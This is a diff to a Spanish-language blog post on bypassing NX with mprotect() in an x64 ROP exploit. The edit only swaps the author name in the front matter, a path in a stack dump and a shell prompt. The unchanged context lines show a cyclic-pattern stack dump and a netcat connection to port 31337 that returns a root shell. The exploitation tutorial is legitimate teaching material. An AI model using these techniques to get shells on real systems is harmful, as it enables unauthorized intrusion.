@@ -1,7 +1,7 @@
 ---
 layout: post
 title: Bypass NX usando mprotect() en x64
-author: c4rta
+author: GuxFiz
 date: 2023-02-26
 ##categories: [Explotacion binaria]
 tags: [Explotacion Binaria, ROP]
@@ -103,7 +103,7 @@ Hace rato les mencione que mprotect recibia un argumento que es la longitud, deb
 0x007fffffffe428│+0x0010: "kaaaaaablaaaaaabmaaa"
 0x007fffffffe430│+0x0018: "laaaaaabmaaa"
 0x007fffffffe438│+0x0020: 0x007f006161616d ("maaa"?)
-0x007fffffffe440│+0x0028: 0x007fffffffe528  →  0x007fffffffe89f  →  "/home/c4rta/Downloads/mprotect"
+0x007fffffffe440│+0x0028: 0x007fffffffe528  →  0x007fffffffe89f  →  "/home/GuxFiz/Downloads/mprotect"
 0x007fffffffe448│+0x0030: 0xc91dfa2faf99b844
 0x007fffffffe450│+0x0038: 0x0000000000000000
 ────────────────────────────────────────────
@@ -200,7 +200,7 @@ p.interactive()
 
 
 ```
-󰣇  c4rta ~/Downloads  nc 192.168.1.76 31337 -v
+󰣇  GuxFiz ~/Downloads  nc 192.168.1.76 31337 -v
 Connection to 192.168.1.76 31337 port [tcp/*] succeeded!
 whoami
 root
